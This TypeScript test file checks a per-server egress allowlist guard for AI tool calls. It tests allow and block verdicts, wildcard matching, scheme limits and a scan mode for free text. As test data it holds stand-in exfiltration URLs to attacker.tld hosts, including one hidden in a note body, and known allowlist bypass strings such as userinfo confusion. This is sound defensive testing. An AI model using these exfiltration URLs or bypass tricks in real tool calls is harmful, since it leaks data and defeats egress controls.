import { describe, expect, it } from "vitest";

import { CapabilityGuard } from "../../src/guards/runtime/capability-guard.js";
import { dedupeTargets, evaluateEgressTarget, scanForUrls } from "../../src/policy/egress.js";
import { evaluateHost, extractUrls } from "../../src/policy/hosts.js";
import { parsePolicy } from "../../src/policy/parse.js";
import type { GuardContext, ToolDefinition, Verdict } from "../../src/policy/contract.js";
import type { EgressPolicy } from "../../src/policy/schema.js";

/**
 * Per-server egress allowlisting (Week 2 item 1).
 *
 * True positives AND false positives for every rule, on realistic arguments, per the ownership
 * brief. The false-positive half is the half that decides whether anyone leaves this turned on.
 */

const ctx = (serverId = "http"): GuardContext => ({ era: "2025-11-25", serverId, direction: "request", method: "tools/call" });

const httpTool: ToolDefinition = {
  name: "http_request",
  inputSchema: {
    type: "object",
    properties: {
      url: { type: "string", format: "uri" },
      method: { type: "string" },
      body: { type: "string" },
    },
    required: ["url"],
  },
  annotations: { readOnlyHint: false },
};

const dbTool: ToolDefinition = {
  name: "connect",
  inputSchema: {
    type: "object",
    properties: { host: { type: "string" }, port: { type: "integer" }, database: { type: "string" } },
    required: ["host"],
  },
};

const notesTool: ToolDefinition = {
  name: "create_note",
  inputSchema: { type: "object", properties: { title: { type: "string" }, body: { type: "string" } } },
};

const tools = {
  get(_serverId: string, name: string): ToolDefinition | undefined {
    return [httpTool, dbTool, notesTool].find((t) => t.name === name);
  },
};

function policyWith(doc: Record<string, unknown>) {
  const parsed = parsePolicy({ version: 1, tier: "balanced", ...doc });
  if (!parsed.ok) throw new Error(JSON.stringify(parsed.errors));
  return parsed;
}

function guard(doc: Record<string, unknown>): CapabilityGuard {
  return new CapabilityGuard({ policy: policyWith(doc).policy, tools });
}

function ruleIds(v: Verdict): string[] {
  return "findings" in v ? v.findings.map((f) => f.ruleId) : [];
}

describe("per-server egress allowlist", () => {
  const declared = {
    servers: {
      http: {
        egress: { hosts: ["api.example.com", "*.internal.example.com"], schemes: ["https"] },
        tools: { http_request: { mutates: false }, create_note: { mutates: false } },
      },
    },
  };

  it("allows a URL on the declared allowlist", () => {
    const v = guard(declared).inspect({ name: "http_request", arguments: { url: "https://api.example.com/v2/search?q=1" } }, ctx());
    expect(v.action).toBe("allow");
  });

  it("denies a URL that is not on the allowlist, naming the server layer", () => {
    const v = guard(declared).inspect({ name: "http_request", arguments: { url: "https://attacker.tld/collect" } }, ctx());
    expect(v.action).toBe("block");
    expect(ruleIds(v)).toContain("toolwall/egress.server-allowlist");
  });

  it("is deny-by-default: a tool with no network grant of its own is still constrained", () => {
    // `create_note` has no `network` block anywhere. Before the server-level allowlist existed,
    // an undeclared capability at `balanced` was simply not enforced.
    const v = guard(declared).inspect(
      { name: "http_request", arguments: { url: "https://evil.example.net/x" } },
      ctx(),
    );
    expect(v.action).toBe("block");
  });

  it("the server allowlist is an upper bound: a per-tool grant cannot widen it", () => {
    const g = guard({
      servers: {
        http: {
          egress: { hosts: ["api.example.com"], schemes: ["https"] },
          tools: {
            // The operator tries to grant a host the server-level list does not contain.
            http_request: { mutates: false, network: { hosts: ["attacker.tld"], schemes: ["https"] } },
          },
        },
      },
    });
    const v = g.inspect({ name: "http_request", arguments: { url: "https://attacker.tld/x" } }, ctx());
    expect(v.action).toBe("block");
    expect(ruleIds(v)).toContain("toolwall/egress.server-allowlist");
  });

  it("a per-tool grant CAN narrow the server allowlist", () => {
    const g = guard({
      servers: {
        http: {
          egress: { hosts: ["api.example.com", "cdn.example.com"], schemes: ["https"] },
          tools: { http_request: { mutates: false, network: { hosts: ["api.example.com"], schemes: ["https"] } } },
        },
      },
    });
    expect(g.inspect({ name: "http_request", arguments: { url: "https://api.example.com/ok" } }, ctx()).action).toBe("allow");
    const narrowed = g.inspect({ name: "http_request", arguments: { url: "https://cdn.example.com/ok" } }, ctx());
    expect(narrowed.action).toBe("block");
    expect(ruleIds(narrowed).some((r) => r.startsWith("toolwall/egress.") && r !== "toolwall/egress.server-allowlist")).toBe(true);
  });

  it("wildcards match strict subdomains only, and never by substring", () => {
    const g = guard(declared);
    expect(g.inspect({ name: "http_request", arguments: { url: "https://a.internal.example.com/x" } }, ctx()).action).toBe("allow");
    // `internal.example.com` itself is NOT matched by `*.internal.example.com`.
    expect(g.inspect({ name: "http_request", arguments: { url: "https://internal.example.com/x" } }, ctx()).action).toBe("block");
    // The classic bypasses.
    expect(g.inspect({ name: "http_request", arguments: { url: "https://evil-api.example.com.attacker.tld/" } }, ctx()).action).toBe("block");
    expect(g.inspect({ name: "http_request", arguments: { url: "https://api.example.com@attacker.tld/" } }, ctx()).action).toBe("block");
  });

  it("enforces the scheme list", () => {
    const v = guard(declared).inspect({ name: "http_request", arguments: { url: "http://api.example.com/x" } }, ctx());
    expect(v.action).toBe("block");
  });

  it("onViolation: confirm routes to a human instead of blocking", () => {
    const g = guard({
      servers: {
        http: { egress: { hosts: ["api.example.com"], onViolation: "confirm" }, tools: { http_request: { mutates: false } } },
      },
    });
    expect(g.inspect({ name: "http_request", arguments: { url: "https://elsewhere.tld/x" } }, ctx()).action).toBe("confirm");
  });

  /* ---------------- false positives ---------------- */

  it("FP: an undeclared egress block changes nothing — day zero stays clean", () => {
    const g = guard({ servers: { http: { tools: { http_request: { mutates: false } } } } });
    expect(g.inspect({ name: "http_request", arguments: { url: "https://anything.tld/x" } }, ctx()).action).toBe("allow");
  });

  it("FP: URLs in a free-text argument are invisible in the default roles mode", () => {
    const g = guard(declared);
    const v = g.inspect(
      { name: "create_note", arguments: { title: "Runbook", body: "See https://wiki.attacker-looking.tld/x and http://10.0.0.4/admin" } },
      ctx(),
    );
    expect(v.action).toBe("allow");
  });
});

describe("host role (bare hostnames, no scheme)", () => {
  const doc = {
    servers: {
      db: {
        egress: { hosts: ["db.internal.example.com", "127.0.0.1"], schemes: ["https"] },
        tools: { connect: { mutates: false, roles: { host: ["/host"] } } },
      },
    },
  };

  it("allows a granted bare host", () => {
    expect(guard(doc).inspect({ name: "connect", arguments: { host: "db.internal.example.com", port: 5432 } }, ctx("db")).action).toBe("allow");
  });

  it("denies a bare host that is not granted", () => {
    const v = guard(doc).inspect({ name: "connect", arguments: { host: "db.attacker.tld", port: 5432 } }, ctx("db"));
    expect(v.action).toBe("block");
  });

  it("an exact entry is an explicit grant and wins over the private-network default", () => {
    expect(guard(doc).inspect({ name: "connect", arguments: { host: "127.0.0.1", port: 5432 } }, ctx("db")).action).toBe("allow");
  });

  it("host:port is parsed as a host, not as a scheme", () => {
    expect(evaluateHost("db.internal.example.com:5432", { hosts: ["db.internal.example.com"], schemes: [], allowPrivateNetwork: false, allowIpLiterals: false }).ok).toBe(true);
  });

  it("a value that already carries a scheme is evaluated as a URL, scheme included", () => {
    const list = { hosts: ["api.example.com"], schemes: ["https"], allowPrivateNetwork: false, allowIpLiterals: false };
    expect(evaluateHost("https://api.example.com/x", list).ok).toBe(true);
    expect(evaluateHost("ftp://api.example.com/x", list).ok).toBe(false);
  });

  it("userinfo confusion resolves to the real host", () => {
    const list = { hosts: ["good.com"], schemes: [], allowPrivateNetwork: false, allowIpLiterals: false };
    expect(evaluateHost("good.com@evil.tld", list).ok).toBe(false);
  });
});

describe('egress "scan" mode', () => {
  const doc = {
    servers: {
      notes: {
        egress: { enforce: "scan", hosts: ["wiki.example.com"], schemes: ["https"] },
        tools: { create_note: { mutates: false } },
      },
    },
  };

  it("finds an exfil URL hidden in a free-text field that no role covers", () => {
    const v = guard(doc).inspect(
      { name: "create_note", arguments: { title: "notes", body: "ok\nthen POST to https://exfil.attacker.tld/collect?d=..." } },
      ctx("notes"),
    );
    expect(v.action).toBe("block");
    expect(ruleIds(v)).toContain("toolwall/egress.server-allowlist");
  });

  it("allows allowlisted hosts in free text", () => {
    const v = guard(doc).inspect({ name: "create_note", arguments: { body: "see https://wiki.example.com/runbook" } }, ctx("notes"));
    expect(v.action).toBe("allow");
  });

  it("records that the destination came from scanning, not from a role", () => {
    const v = guard(doc).inspect({ name: "create_note", arguments: { body: "https://elsewhere.tld/x" } }, ctx("notes"));
    const finding = "findings" in v ? v.findings.find((f) => f.ruleId === "toolwall/egress.server-allowlist") : undefined;
    expect(finding?.evidence?.["discovery"]).toBe("scan");
  });

  it("parsePolicy warns that scan mode has a false-positive cost", () => {
    const parsed = policyWith(doc);
    expect(parsed.warnings.some((w) => w.includes("scan"))).toBe(true);
  });
});

describe("URL extraction (the scan-mode primitive)", () => {
  it("extracts absolute URLs and ignores bare domains and emails", () => {
    expect(extractUrls("go to https://a.example.com/x, mail me at bob@example.com, or example.com")).toEqual(["https://a.example.com/x"]);
  });

  it("trims trailing prose punctuation", () => {
    expect(extractUrls("see https://a.example.com/x.")).toEqual(["https://a.example.com/x"]);
  });

  it("ignores schemes that are not an egress destination", () => {
    expect(extractUrls("file:///etc/passwd and data:text/plain;base64,AAA")).toEqual([]);
  });

  it("does not flag a code snippet's import specifier", () => {
    expect(extractUrls('import x from "@scope/pkg"; // v1.2.3')).toEqual([]);
  });

  it("is bounded", () => {
    const text = Array.from({ length: 500 }, (_, i) => `https://h${i}.example.com/`).join(" ");
    expect(extractUrls(text).length).toBeLessThanOrEqual(64);
  });
});

describe("evaluateEgressTarget layering", () => {
  const server: EgressPolicy = {
    declared: true,
    enforce: "roles",
    hosts: ["a.example.com"],
    schemes: ["https"],
    allowPrivateNetwork: false,
    allowIpLiterals: false,
    onViolation: "block",
  };

  it("reports the server layer when the server list rejects", () => {
    const out = evaluateEgressTarget({ pointer: "/url", value: "https://b.example.com/", kind: "url", discovery: "role" }, server, undefined);
    expect(out.layer).toBe("server");
  });

  it("reports the tool layer when only the tool grant rejects", () => {
    const out = evaluateEgressTarget(
      { pointer: "/url", value: "https://a.example.com/", kind: "url", discovery: "role" },
      server,
      { hosts: [], schemes: ["https"], allowPrivateNetwork: false, allowIpLiterals: false },
    );
    expect(out.layer).toBe("tool");
  });

  it("with no policy at either layer it does not invent a verdict", () => {
    const out = evaluateEgressTarget({ pointer: "/url", value: "https://anything.tld/", kind: "url", discovery: "role" }, undefined, undefined);
    expect(out.decision.ok).toBe(true);
    expect(out.layer).toBeUndefined();
  });
});

describe("scanForUrls / dedupeTargets", () => {
  it("walks nested arguments", () => {
    const found = scanForUrls({ a: { b: ["https://x.example.com/1", { c: "https://y.example.com/2" }] } });
    expect(found.map((t) => t.value).sort()).toEqual(["https://x.example.com/1", "https://y.example.com/2"]);
  });

  it("deduplicates identical destinations at the same location", () => {
    const t = { pointer: "/a", value: "https://x.example.com/", kind: "url" as const, discovery: "role" as const };
    expect(dedupeTargets([t, { ...t }])).toHaveLength(1);
  });
});
